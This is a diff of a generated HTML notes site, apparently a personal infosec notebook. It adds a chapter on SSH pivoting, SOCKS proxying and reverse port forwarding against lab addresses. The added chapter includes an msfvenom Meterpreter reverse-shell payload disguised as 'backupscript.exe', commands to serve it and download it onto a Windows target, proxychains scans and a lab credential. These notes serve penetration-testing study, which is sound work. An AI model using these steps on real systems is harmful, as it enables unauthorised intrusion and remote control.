@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-1442dfd9.js";
+            window.path_to_searchindex_js = "searchindex-7c9311b9.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-3c265b08.js"></script>
+        <script src="toc-59d553c9.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -434,6 +434,13 @@
 <li><a href="#well-known-uris">well-known-uris</a></li>
 <li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
 <li><a href="#windows-authentication-process">windows-auth</a></li>
+<li><a href="infosec/pivoting-tunneling-portforward/README.html">Pivoting, Tunneling, and Port Forwarding</a>
+<ul>
+<li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
+<li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
+<li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="kubernetes/README.html">Kubernetes</a>
@@ -18414,6 +18421,12 @@ ac
 <ul>
 <li><a href="#linux-authentication">linux-auth</a></li>
 </ul>
+<h3 id="pivoting-tunneling-and-port-forwarding"><a class="header" href="#pivoting-tunneling-and-port-forwarding">Pivoting, Tunneling, and Port Forwarding</a></h3>
+<ul>
+<li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
+<li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
+<li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-active-directory"><a class="header" href="#attacking-active-directory">Attacking Active Directory</a></h1>
 <p>We can attempt to extract credentials from Active Directory (ADDS) using dictionary attacks against AD accounts and dumping hashing from the ntds.dit file.</p>
@@ -22261,8 +22274,339 @@ https://learn.microsoft.com/en-us/windows-server/security/windows-authentication
 https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
+<h1 id="pivoting-tunneling-and-port-forwarding-1"><a class="header" href="#pivoting-tunneling-and-port-forwarding-1">Pivoting, Tunneling, and Port Forwarding</a></h1>
 <h2 id="directory-map-14"><a class="header" href="#directory-map-14">Directory Map</a></h2>
+<ul>
+<li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
+<li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
+<li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h1>
+<p>Local port forwarding binds a local port and forwards traffic through SSH to a destination on the remote network.</p>
+<h2 id="syntax"><a class="header" href="#syntax">Syntax</a></h2>
+<pre><code class="language-bash">ssh -L &lt;local_port&gt;:&lt;destination&gt;:&lt;destination_port&gt; user@pivot_host
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Parameter</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>local_port</code></td><td>Port on your attack host to listen on</td></tr>
+<tr><td><code>destination</code></td><td>Target host from the pivot’s perspective (often <code>localhost</code>)</td></tr>
+<tr><td><code>destination_port</code></td><td>Port of the service you want to access</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="step-by-step-instructions"><a class="header" href="#step-by-step-instructions">Step-by-Step Instructions</a></h2>
+<h3 id="step-1-identify-the-target-service"><a class="header" href="#step-1-identify-the-target-service">Step 1: Identify the Target Service</a></h3>
+<p>Scan the pivot host to find services you want to access:</p>
+<pre><code class="language-bash">nmap -sT -p22,3306 10.129.202.64
+</code></pre>
+<p>Example output showing MySQL on port 3306 (closed externally but accessible locally):</p>
+<pre><code>PORT     STATE  SERVICE
+22/tcp   open   ssh
+3306/tcp closed mysql
+</code></pre>
+<h3 id="step-2-create-the-ssh-tunnel"><a class="header" href="#step-2-create-the-ssh-tunnel">Step 2: Create the SSH Tunnel</a></h3>
+<p>Forward the remote service to a local port:</p>
+<pre><code class="language-bash">ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+</code></pre>
+<p>This binds local port 1234 and forwards traffic to MySQL (3306) on the remote host.</p>
+<h3 id="step-3-verify-the-tunnel-is-active"><a class="header" href="#step-3-verify-the-tunnel-is-active">Step 3: Verify the Tunnel is Active</a></h3>
+<p><strong>Option A: Using netstat</strong></p>
+<pre><code class="language-bash">netstat -antp | grep 1234
+</code></pre>
+<p>Expected output:</p>
+<pre><code>tcp   0   0 127.0.0.1:1234   0.0.0.0:*   LISTEN   4034/ssh
+</code></pre>
+<p><strong>Option B: Using nmap</strong></p>
+<pre><code class="language-bash">nmap -sV -p1234 localhost
+</code></pre>
+<p>Should identify the forwarded service (e.g., MySQL 8.0.28).</p>
+<h3 id="step-4-access-the-service-locally"><a class="header" href="#step-4-access-the-service-locally">Step 4: Access the Service Locally</a></h3>
+<p>Connect to the service through your local port:</p>
+<pre><code class="language-bash"># MySQL example
+mysql -h 127.0.0.1 -P 1234 -u root -p
+
+# Or run exploits against localhost:1234
+</code></pre>
+<h2 id="forwarding-multiple-ports"><a class="header" href="#forwarding-multiple-ports">Forwarding Multiple Ports</a></h2>
+<p>Chain multiple <code>-L</code> arguments to forward several services at once:</p>
+<pre><code class="language-bash">ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+</code></pre>
+<p>This forwards:</p>
+<ul>
+<li>Remote MySQL (3306) → Local port 1234</li>
+<li>Remote HTTP (80) → Local port 8080</li>
+</ul>
+<h2 id="example-accessing-internal-mysql"><a class="header" href="#example-accessing-internal-mysql">Example: Accessing Internal MySQL</a></h2>
+<pre><code>Attack Host                      Pivot Host (Ubuntu)
+10.10.15.5                       10.129.202.64
+    │                                  │
+    │ SSH tunnel (-L 1234:localhost:3306)
+    │◄─────────────────────────────────┤
+    │                                  │
+localhost:1234  ◄──────────────►  localhost:3306 (MySQL)
+</code></pre>
+<p><strong>Commands:</strong></p>
+<pre><code class="language-bash"># 1. Create tunnel
+ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+
+# 2. In another terminal, connect to MySQL
+mysql -h 127.0.0.1 -P 1234 -u root -p
+</code></pre>
+<h2 id="when-to-use"><a class="header" href="#when-to-use">When to Use</a></h2>
+<ul>
+<li>Access services bound to localhost on remote host</li>
+<li>Run local exploits against remote services</li>
+<li>Bypass firewall rules blocking direct access</li>
+<li>Debug/inspect traffic on specific ports</li>
+<li>Service enumeration with local tools</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ssh-dynamic-port-forwarding-with-socks"><a class="header" href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding with SOCKS</a></h1>
+<p>Dynamic port forwarding creates a SOCKS proxy, allowing you to route traffic to an entire network through a pivot host.</p>
+<h2 id="syntax-1"><a class="header" href="#syntax-1">Syntax</a></h2>
+<pre><code class="language-bash">ssh -D &lt;local_port&gt; user@pivot_host
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Parameter</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>local_port</code></td><td>Port on your attack host for the SOCKS proxy</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="step-by-step-instructions-1"><a class="header" href="#step-by-step-instructions-1">Step-by-Step Instructions</a></h2>
+<h3 id="step-1-identify-the-pivot-host"><a class="header" href="#step-1-identify-the-pivot-host">Step 1: Identify the Pivot Host</a></h3>
+<p>First, confirm the pivot host has access to the internal network:</p>
+<pre><code class="language-bash"># SSH into the pivot host
+ssh ubuntu@10.129.202.64
+
+# Check network interfaces
+ifconfig
+</code></pre>
+<p>Look for multiple NICs (e.g., one facing you, one facing internal network):</p>
+<pre><code>ens192: inet 10.129.202.64    ← Your connection
+ens224: inet 172.16.5.129     ← Internal network (172.16.5.0/23)
+</code></pre>
+<h3 id="step-2-start-the-socks-proxy"><a class="header" href="#step-2-start-the-socks-proxy">Step 2: Start the SOCKS Proxy</a></h3>
+<p>On your attack host, create the dynamic tunnel:</p>
+<pre><code class="language-bash">ssh -D 9050 ubuntu@10.129.202.64
+</code></pre>
+<p>This starts a SOCKS listener on <code>localhost:9050</code>.</p>
+<h3 id="step-3-configure-proxychains"><a class="header" href="#step-3-configure-proxychains">Step 3: Configure Proxychains</a></h3>
+<p>Edit the proxychains configuration:</p>
+<pre><code class="language-bash">sudo nano /etc/proxychains.conf
+</code></pre>
+<p>Ensure the last line matches your SOCKS port:</p>
+<pre><code>socks4  127.0.0.1 9050
+</code></pre>
+<h3 id="step-4-scan-the-internal-network"><a class="header" href="#step-4-scan-the-internal-network">Step 4: Scan the Internal Network</a></h3>
+<p>Use proxychains to route nmap through the tunnel:</p>
+<pre><code class="language-bash"># Host discovery (slow but useful for mapping)
+proxychains nmap -v -sn 172.16.5.1-200
+
+# Full port scan on specific target
+proxychains nmap -v -Pn -sT 172.16.5.19
+</code></pre>
+<p>Example output:</p>
+<pre><code>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:445-&lt;&gt;&lt;&gt;-OK
+Discovered open port 445/tcp on 172.16.5.19
+Discovered open port 3389/tcp on 172.16.5.19
+</code></pre>
+<h3 id="step-5-access-internal-services"><a class="header" href="#step-5-access-internal-services">Step 5: Access Internal Services</a></h3>
+<p>Use any tool through proxychains:</p>
+<pre><code class="language-bash"># RDP to internal Windows host
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+# Run Metasploit through the proxy
+proxychains msfconsole
+
+# Web requests
+proxychains curl http://172.16.5.19
+</code></pre>
+<h2 id="network-diagram"><a class="header" href="#network-diagram">Network Diagram</a></h2>
+<pre><code>Attack Host                    Pivot Host                    Internal Network
+10.10.15.5                     10.129.202.64                 172.16.5.0/23
+    │                          172.16.5.129                       │
+    │                               │                             │
+    │ SOCKS Proxy (9050)            │                             │
+    │◄──────────────────────────────┤                             │
+    │                               │                             │
+proxychains ────► SSH tunnel ──────►├─────────────────────────────┤
+                                    │                             │
+                              Can reach:              Windows DC: 172.16.5.19
+                              172.16.5.1-254          Web Server: 172.16.5.50
+</code></pre>
+<h2 id="socks-protocol-versions"><a class="header" href="#socks-protocol-versions">SOCKS Protocol Versions</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Version</th><th>Authentication</th><th>UDP Support</th></tr>
+</thead>
+<tbody>
+<tr><td>SOCKS4</td><td>No</td><td>No</td></tr>
+<tr><td>SOCKS5</td><td>Yes</td><td>Yes</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="important-limitations"><a class="header" href="#important-limitations">Important Limitations</a></h2>
+<h3 id="full-tcp-connect-scans-only"><a class="header" href="#full-tcp-connect-scans-only">Full TCP Connect Scans Only</a></h3>
+<p>Proxychains cannot handle partial packets. Use <code>-sT</code> (full connect) not <code>-sS</code> (SYN scan):</p>
+<pre><code class="language-bash"># Correct
+proxychains nmap -sT -Pn 172.16.5.19
+
+# Wrong - will give incorrect results
+proxychains nmap -sS 172.16.5.19
+</code></pre>
+<h3 id="windows-host-scanning"><a class="header" href="#windows-host-scanning">Windows Host Scanning</a></h3>
+<p>Windows Defender blocks ICMP by default. Always use <code>-Pn</code> to skip host discovery:</p>
+<pre><code class="language-bash">proxychains nmap -v -Pn -sT 172.16.5.19
+</code></pre>
+<h3 id="performance"><a class="header" href="#performance">Performance</a></h3>
+<p>Full TCP scans over proxychains are slow. Focus on:</p>
+<ul>
+<li>Individual hosts</li>
+<li>Small IP ranges</li>
+<li>Known-alive targets</li>
+</ul>
+<h2 id="example-workflows"><a class="header" href="#example-workflows">Example Workflows</a></h2>
+<h3 id="scanning-and-enumerating-rdp"><a class="header" href="#scanning-and-enumerating-rdp">Scanning and Enumerating RDP</a></h3>
+<pre><code class="language-bash"># Step 1: Start SOCKS proxy
+ssh -D 9050 ubuntu@10.129.202.64
+
+# Step 2: Scan for RDP
+proxychains nmap -v -Pn -sT -p3389 172.16.5.19
+
+# Step 3: Use Metasploit to enumerate
+proxychains msfconsole
+</code></pre>
+<pre><code>msf6 &gt; use auxiliary/scanner/rdp/rdp_scanner
+msf6 &gt; set rhosts 172.16.5.19
+msf6 &gt; run
+
+[*] 172.16.5.19:3389 - Detected RDP on 172.16.5.19:3389 (name:DC01) (domain:DC01) (os_version:10.0.17763)
+</code></pre>
+<pre><code class="language-bash"># Step 4: Connect via RDP
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+</code></pre>
+<h3 id="smb-enumeration"><a class="header" href="#smb-enumeration">SMB Enumeration</a></h3>
+<pre><code class="language-bash">proxychains smbclient -L //172.16.5.19 -U 'domain\user'
+proxychains crackmapexec smb 172.16.5.19 -u user -p password
+</code></pre>
+<h2 id="when-to-use-1"><a class="header" href="#when-to-use-1">When to Use</a></h2>
+<ul>
+<li>Scanning networks not directly reachable</li>
+<li>Accessing multiple services on internal network</li>
+<li>Pivoting through NAT’d networks</li>
+<li>Hiding source IP (target sees pivot host IP)</li>
+<li>Running multiple tools against internal targets</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ssh-remotereverse-port-forwarding"><a class="header" href="#ssh-remotereverse-port-forwarding">SSH Remote/Reverse Port Forwarding</a></h1>
+<p>Remote port forwarding allows a target with no route back to your attack host to connect through a pivot host. Essential for reverse shells when the target can only reach internal networks.</p>
+<h2 id="syntax-2"><a class="header" href="#syntax-2">Syntax</a></h2>
+<pre><code class="language-bash">ssh -R &lt;bind_address&gt;:&lt;bind_port&gt;:&lt;forward_host&gt;:&lt;forward_port&gt; user@pivot_host -vN
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Parameter</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>bind_address</code></td><td>Interface on pivot host to listen on</td></tr>
+<tr><td><code>bind_port</code></td><td>Port on pivot host to listen on</td></tr>
+<tr><td><code>forward_host</code></td><td>Where to forward connections (usually <code>0.0.0.0</code> for your listener)</td></tr>
+<tr><td><code>forward_port</code></td><td>Port on your attack host (your listener)</td></tr>
+<tr><td><code>-v</code></td><td>Verbose mode (shows connection logs)</td></tr>
+<tr><td><code>-N</code></td><td>No shell prompt (forwarding only)</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="the-problem"><a class="header" href="#the-problem">The Problem</a></h2>
+<pre><code>Attack Host (10.10.15.x)
+    │
+    │ SSH ✓
+    ▼
+Pivot Host (10.129.x.x / 172.16.5.129)
+    │
+    │ RDP ✓
+    ▼
+Windows Target (172.16.5.19)
+    │
+    ✗ No route to Attack Host
+</code></pre>
+<p>The Windows target cannot initiate connections back to the attack host.</p>
+<h2 id="the-solution"><a class="header" href="#the-solution">The Solution</a></h2>
+<p>Forward a port on the pivot host back to your listener:</p>
+<pre><code class="language-bash">ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
+</code></pre>
+<p>This makes the pivot host listen on <code>172.16.5.129:8080</code> and forward all connections to your attack host on port <code>8000</code>.</p>
+<h2 id="step-by-step-instructions-2"><a class="header" href="#step-by-step-instructions-2">Step-by-Step Instructions</a></h2>
+<h3 id="step-1-create-payload-pointing-to-pivot-host"><a class="header" href="#step-1-create-payload-pointing-to-pivot-host">Step 1: Create Payload Pointing to Pivot Host</a></h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_https \
+  lhost=172.16.5.129 \
+  lport=8080 \
+  -f exe -o backupscript.exe
+</code></pre>
+<p>Note: <code>lhost</code> is the pivot host IP (reachable by target), not your attack host.</p>
+<h3 id="step-2-start-metasploit-listener"><a class="header" href="#step-2-start-metasploit-listener">Step 2: Start Metasploit Listener</a></h3>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<pre><code>msf6 &gt; use exploit/multi/handler
+msf6 &gt; set payload windows/x64/meterpreter/reverse_https
+msf6 &gt; set lhost 0.0.0.0
+msf6 &gt; set lport 8000
+msf6 &gt; run
+</code></pre>
+<h3 id="step-3-transfer-payload-to-pivot-host"><a class="header" href="#step-3-transfer-payload-to-pivot-host">Step 3: Transfer Payload to Pivot Host</a></h3>
+<pre><code class="language-bash">scp backupscript.exe ubuntu@10.129.202.64:~/
+</code></pre>
+<h3 id="step-4-serve-payload-from-pivot-host"><a class="header" href="#step-4-serve-payload-from-pivot-host">Step 4: Serve Payload from Pivot Host</a></h3>
+<p>On pivot host:</p>
+<pre><code class="language-bash">python3 -m http.server 8123
+</code></pre>
+<h3 id="step-5-download-payload-on-target"><a class="header" href="#step-5-download-payload-on-target">Step 5: Download Payload on Target</a></h3>
+<p>On Windows target:</p>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+</code></pre>
+<h3 id="step-6-create-remote-port-forward"><a class="header" href="#step-6-create-remote-port-forward">Step 6: Create Remote Port Forward</a></h3>
+<pre><code class="language-bash">ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
+</code></pre>
+<p>Flags:</p>
+<ul>
+<li><code>-R</code> - Remote port forward</li>
+<li><code>-v</code> - Verbose (see connection logs)</li>
+<li><code>-N</code> - No shell prompt (just forwarding)</li>
+</ul>
+<h3 id="step-7-execute-payload"><a class="header" href="#step-7-execute-payload">Step 7: Execute Payload</a></h3>
+<p>Run <code>backupscript.exe</code> on Windows target.</p>
+<h3 id="step-8-receive-shell"><a class="header" href="#step-8-receive-shell">Step 8: Receive Shell</a></h3>
+<p>Connection flow:</p>
+<pre><code>Windows (172.16.5.19) → Pivot:8080 → SSH tunnel → Attack Host:8000
+</code></pre>
+<p>Meterpreter shows connection from <code>127.0.0.1</code> (local SSH socket).</p>
+<h2 id="verifying-the-forward"><a class="header" href="#verifying-the-forward">Verifying the Forward</a></h2>
+<p>The <code>-v</code> flag shows connection logs:</p>
+<pre><code>debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
+debug1: channel 1: connected to 0.0.0.0 port 8000
+</code></pre>
+<h2 id="when-to-use-2"><a class="header" href="#when-to-use-2">When to Use</a></h2>
+<ul>
+<li>Target has no route to attack host</li>
+<li>Need reverse shell through pivot</li>
+<li>RDP clipboard disabled (need file transfer)</li>
+<li>Running exploits requiring Meterpreter session</li>
+<li>Enumeration requiring low-level Windows API access</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
+<h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory Map</a></h2>
 <ul>
 <li><a href="kubernetes/cks">cks</a></li>
 <li><a href="kubernetes/kcna">kcna</a></li>
@@ -22270,7 +22614,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
-<h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory Map</a></h2>
+<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory Map</a></h2>
 <ul>
 <li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
 <li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
@@ -25385,7 +25729,7 @@ EOF
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
-<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory Map</a></h2>
+<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
 </ul>
@@ -25919,7 +26263,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
-<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
+<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
 </ul>
@@ -26520,7 +26864,7 @@ spec:
 </h4>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
-<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
+<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory Map</a></h2>
 <ul>
 <li><a href="networking/browser-networking">browser-networking</a></li>
 <li><a href="networking/http">http</a></li>
@@ -26550,7 +26894,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
-<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory Map</a></h2>
+<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
 <ul>
 <li><a href="#chapter-1">chapter01</a></li>
 <li><a href="#chapter-2">chapter02</a></li>
@@ -26823,7 +27167,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <p>WebSockets can transfer test or binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http"><a class="header" href="#http">HTTP</a></h1>
-<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
+<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
 <ul>
 <li><a href="#clean-urls">clean_urls</a></li>
 <li><a href="#http-persistent-connection">persistent_connections</a></li>
@@ -26924,7 +27268,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
-<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
+<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
 <ul>
 <li><a href="#load-balancing-1">load-balancing</a></li>
 </ul>
@@ -26959,7 +27303,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
-<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
+<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
 <ul>
 <li><a href="#set-header">custom-header-response</a></li>
 </ul>
@@ -26973,7 +27317,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
-<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
+<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
 <ul>
 <li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
 <li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
@@ -27130,7 +27474,7 @@ func main() {
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
-<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
+<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
 <ul>
 <li><a href="#dns-3">dns</a></li>
 <li><a href="#ftp-2">ftp</a></li>
@@ -28193,7 +28537,7 @@ iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64"
 <h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
-<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
+<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
 <ul>
 <li><a href="#redis-2">redis</a></li>
 </ul>
@@ -28306,7 +28650,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
-<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
+<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
 <ul>
 <li><a href="#bash-notes">bash_notes</a></li>
 <li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
@@ -28581,7 +28925,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="commands-2"><a class="header" href="#commands-2">Commands</a></h1>
-<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
+<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
 <li><a href="#chmod">chmod</a></li>
@@ -29120,7 +29464,7 @@ https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt</p>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
-<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
+<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
 <li><a href="#memory-management">memory_management</a></li>
@@ -30307,7 +30651,7 @@ Node 0, zone   Normal   3170   7694  10543   8113   5011   1761    552    182   
 <h1 id="networking-1"><a class="header" href="#networking-1">Networking</a></h1>
 <h2 id="tcp"><a class="header" href="#tcp">TCP</a></h2>
 <p>Connections with TCP are established with a 3-way handshake (SYN-SYNACK-ACK)</p>
-<h3 id="performance"><a class="header" href="#performance">Performance</a></h3>
+<h3 id="performance-1"><a class="header" href="#performance-1">Performance</a></h3>
 <p>TCP can provide a high rate of throughput even on a high-latency network, by using buffering and a sliding window. TCP also employs congestion control and a congestion window set by the sender, so that it can maintain a high but also reliable rate of transmission across different and varying networks. Congestion control avoids sending too many packets, which could cause congestion and a performance breakdown.</p>
 <p>The following is a summary of TCP performance features:</p>
 <ul>
@@ -30910,7 +31254,7 @@ As stated above, most processes have the same EUID and RUID. As a result, the de
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
-<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
+<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
 <ul>
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
@@ -35016,14 +35360,14 @@ sudo cp /etc/shadow /tmp/shadow.bak
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-4"><a class="header" href="#troubleshooting-4">Troubleshooting</a></h1>
-<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
+<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
 <li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-1"><a class="header" href="#linux-1">Linux</a></h1>
-<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
+<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-memory">memory</a></li>
 </ul>
@@ -35115,7 +35459,7 @@ For every service, check the request rate, errors, and duration per request</p>
 </ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
-<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
+<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
 <li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
@@ -35241,7 +35585,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When…</a></h1>
-<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
+<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
 <ul>
 <li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
 </ul>
